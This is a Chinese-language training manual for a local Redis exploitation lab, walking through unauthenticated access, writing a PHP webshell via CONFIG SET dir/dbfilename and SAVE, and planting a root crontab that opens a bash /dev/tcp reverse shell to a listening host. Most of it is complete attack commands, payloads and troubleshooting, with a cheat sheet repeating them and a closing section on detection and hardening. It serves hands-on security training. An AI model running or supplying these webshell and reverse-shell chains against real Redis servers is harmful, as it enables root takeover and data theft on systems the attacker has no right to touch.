# Redis RCE · 练习手册

一台「6379 裸奔在公网上」的 Redis，能被打到什么程度。三关递进：
读全库 → 写 webshell → 写计划任务反弹 root shell。

和 `gopher/` 里 L3 / L4 的区别：那边入口是 web 的 SSRF，payload 要编码成
`gopher://` URL 借别人的手发出去；这里 6379 直接暴露，没有中间商，
练的是纯 Redis 利用，包括手写 RESP 协议。

---

## 1. 环境

```bash
# 方式一：并入主编排（推荐，和其他靶场一起起）
./lab.sh up
# redis 127.0.0.1:16379 · web http://127.0.0.1:8911/

# 方式二：只跑这个靶场
docker compose -f redis-rce/compose.yml up -d
./redis-rce/setup.sh
# redis 127.0.0.1:16379 · web http://127.0.0.1:18080/
```

`poc/*.py` 会自动探测 web 端口（8911 / 18080 谁开着用谁），也可以
`export LAB_WEB_PORT=8911` 写死。

> 两种方式共用同一批容器名，**不能同时起**。切换前先
> `docker compose -f redis-rce/compose.yml down` 或 `./lab.sh down`。

容器拓扑：

```
宿主 127.0.0.1:16379 ──► redis-rce-redis (root, busybox crond, 挂 ./www)
宿主 127.0.0.1:8911  ──► redis-rce-web   (php:8.1-apache, 挂 ./www)
                         两个容器共享 ./redis-rce/www，这是 L2 成立的前提
```

redis 故意以 root 运行。官方镜像默认会 `su-exec` 降到 redis 用户，
一降权就写不了 `/var/www/html` 和 `/etc/crontabs`，L2 / L3 都不成立。
真实环境里「用 root 起 redis」非常常见，这正是危害大的原因。

---

## 2. 攻击面

| 面 | 值 | 用途 |
|---|---|---|
| 端口 | 6379（宿主 16379） | 未授权访问入口 |
| 认证 | 无 | `requirepass` 空 |
| 保护模式 | `protected-mode no` | 允许非本机连接 |
| 落盘 | `CONFIG SET dir` + `dbfilename` 可用 | L2 / L3 的核心 |
| 运行身份 | root | 写任意目录、cron 以 root 执行 |

`poc/01_probe.py` 里手写的 RESP 编码只有两条规则：

```
*N\r\n              这条命令有几个参数
$len\r\n<数据>\r\n   每个参数先报字节数，再跟原始字节
```

---

## 3. L1 · 未授权访问

**原理**：Redis 早期设计假设「只在内网用」，没有认证层；后来加了
`requirepass`，但大量实例仍是空密码 + 监听 0.0.0.0。

**步骤**

```bash
redis-cli -h 127.0.0.1 -p 16379
127.0.0.1:16379> INFO server
127.0.0.1:16379> CONFIG GET dir
127.0.0.1:16379> KEYS *
127.0.0.1:16379> GET flag_l1
```

**为什么要先摸环境**：`INFO` 能拿到版本（决定能不能 `CONFIG SET`）、
`CONFIG GET dir` 能拿到当前落盘目录（决定 L2 / L3 往哪写）、
`KEYS *` 本身就是数据泄露。直接上 payload 不看环境，是新手最容易白忙的地方。

flag：`flag{r3d1s_n0_auth_l34k_3v3ryth1ng}`

---

## 4. L2 · SAVE 写 webshell

**原理**：Redis 的持久化就是把内存里的数据序列化成 RDB 文件写到磁盘，
而「写到哪个目录、叫什么名字」可以运行时改：

```
内存                                           磁盘
SET payload "<?php ... ?>"   ──┐
CONFIG SET dir  /var/www/html/uploads  ──┤
CONFIG SET dbfilename shell.php        ──┴──► SAVE ──► uploads/shell.php
```

**为什么 PHP 能执行**：RDB 不是纯文本，开头有 `REDIS0012` 和一堆二进制元数据。
PHP 只在遇到 `<?php` 之后才开始解析，前面的垃圾被当 HTML 原样输出，不影响执行。
所以访问时页面会先吐一串乱码，然后才是命令结果。

**步骤**

```bash
redis-cli -p 16379 CONFIG SET rdbcompression no
redis-cli -p 16379 CONFIG SET dir /var/www/html/uploads
redis-cli -p 16379 CONFIG SET dbfilename shell.php
redis-cli -p 16379 SET payload '<?php system($_GET["c"]); ?>'
redis-cli -p 16379 SAVE

curl "http://127.0.0.1:8911/uploads/shell.php?c=id"
curl "http://127.0.0.1:8911/uploads/shell.php?c=cat+/flag_l2"
```

执行身份是 `www-data`，因为跑 PHP 的是 apache 进程。

flag：`flag{r3d1s_s4v3_wr1t3s_w3bsh3ll}`

---

## 5. L3 · 写 crontab 反弹 root shell

**原理**：L2 只拿到 www-data，想升级就得让「root 身份的进程」替我们干活。
cron 就是那个进程 —— 它每分钟扫一次 crontab 目录，按 root 身份执行命令。

链条还是 `CONFIG SET dir` + `dbfilename` + `SET` + `SAVE`，只换落点：

```
SET x "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<攻击机IP>/4444 0>&1'\n\n"
CONFIG SET dir /etc/crontabs
CONFIG SET dbfilename root
SAVE
```

反弹 shell 的三个重定向：

- `bash -i`：起交互式 shell
- `>& /dev/tcp/IP/PORT`：把 stdout + stderr 接到这个 socket（`>&` 是
  `>file 2>&1` 的简写）
- `0>&1`：再把 stdin 也接到同一个 socket，这样双向通

`/dev/tcp` 是 bash 的内建特性，`/bin/sh`（dash / ash）不支持，所以必须显式
`bash -c`。

**步骤**（两个终端）

```bash
# 终端 A：先监听
nc -l 4444

# 终端 B：写入
redis-cli -p 16379 CONFIG SET rdbcompression no
redis-cli -p 16379 CONFIG SET dir /etc/crontabs
redis-cli -p 16379 CONFIG SET dbfilename root
redis-cli -p 16379 SET x $'\n\n* * * * * /bin/bash -c \'bash -i >& /dev/tcp/192.168.65.254/4444 0>&1\'\n\n'
redis-cli -p 16379 SAVE
```

等 60 秒左右（cron 按分钟触发），终端 A 会拿到一个 `#` 提示符：

```
# id
uid=0(root) ...
# cat /flag_l3
```

flag：`flag{r3d1s_cr0n_r00t_r3v3rs3_sh3ll}`

> `192.168.65.254` 是 Docker Desktop 里宿主机的地址。换机器就用
> `getent ahostsv4 host.docker.internal` 查，别直接写域名（见坑 4）。

---

## 6. Redis 弹 Shell 的原理总纲

Redis 本身不执行代码，它能变成 RCE，靠的是「**可控内容 + 可控路径 +
可控文件名**」这三个要素同时存在：

- 可控内容：`SET key value`，value 是任意字节
- 可控路径：`CONFIG SET dir`
- 可控文件名：`CONFIG SET dbfilename`

三者凑齐，Redis 就从「数据库」变成「任意文件写入器」。剩下的只是选一个
「会被系统自动执行」的落点：

| 落点 | 触发者 | 权限 | 前提 |
|---|---|---|---|
| `/var/www/html/*.php` | web 进程 | www-data | 知道 web 根目录 |
| `/etc/crontabs/root`、`/etc/cron.d/*` | cron | root | cron 在跑、权限校验过关 |
| `/root/.ssh/authorized_keys` | sshd | root | 开了 SSH、允许密钥登录 |
| `/etc/ld.so.preload` | 任意动态链接程序 | root | 写入后系统可能直接坏掉，慎用 |

为什么能写这些目录：**redis 以 root 运行**。以 redis 用户跑的话，
`/var/www` 和 `/etc/crontabs` 都写不进去，整条链断在第一步。

---

## 7. 坑

以下六个都是搭这个靶场时实际撞上的，按撞上的顺序排。

### 坑 1：RDB 压缩把 payload 压成乱码

**现象**：crontab 文件写进去了，`ls` 看得到，但 cron 从不执行。
`cat -v` 一看：

```
* *M- ^A^Vroot /usr/bin/bash -c 'M-^@^H^_i >& /dev/tcp/...
```

`* * * * *` 变成了 `* *M- ^A^V`。

**原因**：`rdbcompression` 默认 `yes`，Redis 保存字符串时做 LZF 压缩。
`* * * * *` 重复度极高，压缩比接近 10:1，直接变成二进制。

**解决**：`CONFIG SET rdbcompression no`，再 `SAVE`。

### 坑 2：RDB 二进制前缀吃掉整行

**现象**：压缩关掉后内容是完整的一行，cron 还是不执行。
`od -c` 看文件：

```
R E D I S 0 0 1 2 \0 001 x @ T *   *   *   *   *   r o o t ...
```

`* * * * *` 前面紧贴着 `\0`，**中间没有换行**。

**原因**：RDB 里 key 和 value 是紧挨着二进制存的，没有分隔符。cron 按行解析，
这一行以 `\0` 开头，`strlen` 量出来是 0，整行当空行丢掉。

**解决**：payload 前后各补两个换行 `\n\n`，让 crontab 行独立成行；
后面的 `\n` 还能防止 RDB 的 EOF 字节（`\xff`）粘在命令末尾。

### 坑 3：Debian 的 cron 直接拒收整个文件

**现象**：换成 Debian 容器（`/etc/cron.d/pwn`）后，连干净的测试行都不执行。

**验证方法**：同时放两个文件做对照。

```
/etc/cron.d/t1   * * * * * root /bin/date > /tmp/t1_ok          → 执行
/etc/cron.d/t2   REDIS0012\0\1x@T\n\n* * * * * root ...        → 不执行
```

**原因**：Debian 的 vixie cron 遇到无法解析的二进制行时会放弃整个文件；
而且 `/var/spool/cron/crontabs/root` 要求权限必须是 **600**，Redis 写出来是
644（受进程 umask 影响），直接判 `bad mode` 拒读。两条路都堵死。

**解决**：靶场改用 alpine + busybox crond。它逐行解析、坏行跳过，644 也不计较。
这本身是个知识点：**同一条利用链在不同发行版上成功率不一样**，Debian 上
通常直接转主从复制 RCE。

### 坑 4：`host.docker.internal` 解析成 IPv6，回连失败

**现象**：cron 确实执行了命令（有进程痕迹），但监听端一直等不到连接。
手动在容器里跑同样的命令：

```
bash: connect: Network is unreachable
bash: /dev/tcp/host.docker.internal/4444: Network is unreachable
```

**原因**：这个域名同时有 A 和 AAAA 记录，bash 的 `/dev/tcp` 优先走 IPv6，
而容器内没有 IPv6 路由。

**解决**：用 `getent ahostsv4 host.docker.internal` 取 IPv4 字面量
（Docker Desktop 上是 `192.168.65.254`）塞进 payload。`poc/03_cron_revshell.py`
里 `callback_ip()` 做的就是这件事。

### 坑 5：`bash -i` 在非 tty 下只回显不执行

**现象**：一次发 `id; cat /flag_l3; echo __DONE__`，屏幕上只有命令本身被回显，
没有任何输出。

**原因**：`bash -i` 在 socket（非 tty）上跑时走 readline，把多条命令用分号
串成一行一次灌进去，偶尔会卡在回显阶段不进入执行。

**解决**：一条一条发，每条等到提示符 `#` 再发下一条。

### 坑 6：Redis 7 默认禁止 `CONFIG SET dir`

**现象**：真实环境里执行 `CONFIG SET dir /tmp` 直接报
`ERR CONFIG SET failed (possibly related to argument 'dir') - can't set immutable config`。

**原因**：Redis 7 把 `dir`、`dbfilename` 等列进 protected config，运行时禁止修改。
靶场靠 `enable-protected-configs yes` 还原了老版本行为，否则 L2 / L3 的
第一步就过不去。

**真实环境怎么办**：降到 Redis ≤ 6，或者放弃写文件、改走主从复制 RCE。

---

## 8. 现代 Redis 为什么越来越难打

| 加固项 | 效果 | 绕过难度 |
|---|---|---|
| `requirepass` 强密码 | L1 直接死 | 需要弱口令爆破 |
| `bind 127.0.0.1` | 外网连不上 | 需要 SSRF 或内网跳板 |
| `protected-mode yes` | 非本机拒绝 | 同上 |
| `rename-command CONFIG ""` | 写文件链断了 | 高 |
| Redis 7 protected config | `CONFIG SET dir` 禁用 | 高 |
| 非 root 运行 | 只能写 web 目录 | 中 |

全都关上之后还剩一条路：**主从复制 RCE**。

原理：让目标 `SLAVEOF <攻击机> 6379`，攻击机伪装成 master，在 `FULLRESYNC`
阶段推一个特制 RDB 过去，里面带 `MODULE LOAD` 记录。目标加载 RDB 时顺带
加载恶意 .so，之后就能 `system.exec "命令"`。

它不需要 `CONFIG SET dir`，也不需要目标可写任何目录，所以是 Redis 6/7 时代
的主流打法。代价是要编译对应架构的 .so，并且目标得允许 `SLAVEOF`
（`rename-command SLAVEOF` 也能挡）。

---

## 9. 防守视角

发现：

- 6379 不该出现在公网。`ss -lntp | grep 6379` 看监听地址
- Redis 日志里出现 `CONFIG SET`、`SLAVEOF`、`MODULE LOAD` 都是强信号
- web 目录里出现以 `REDIS` 开头的文件 → L2 的痕迹
- `/etc/crontabs/`、`/etc/cron.d/` 里出现非运维写入的文件 → L3 的痕迹
- `authorized_keys` 里多出不认识的公钥 → SSH 落点

加固：

```conf
requirepass <强密码>
bind 127.0.0.1 -::1
protected-mode yes
rename-command CONFIG ""
rename-command SLAVEOF ""
rename-command MODULE ""
```

跑在非 root 用户下，并且用独立的数据目录。

---

## 10. 速查表

```bash
# 探测
redis-cli -h 127.0.0.1 -p 16379 INFO
redis-cli -h 127.0.0.1 -p 16379 CONFIG GET '*'

# L2
CONFIG SET rdbcompression no
CONFIG SET dir /var/www/html/uploads
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["c"]); ?>'
SAVE

# L3
CONFIG SET rdbcompression no
CONFIG SET dir /etc/crontabs
CONFIG SET dbfilename root
SET x "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.65.254/4444 0>&1'\n\n"
SAVE

# 收尾：把配置改回去，避免干扰下一关
CONFIG SET dir /data
CONFIG SET dbfilename dump.rdb
CONFIG SET rdbcompression yes
```

三关脚本：`poc/01_probe.py`、`poc/02_webshell.py`、`poc/03_cron_revshell.py`。
先自己做，卡住再对答案。
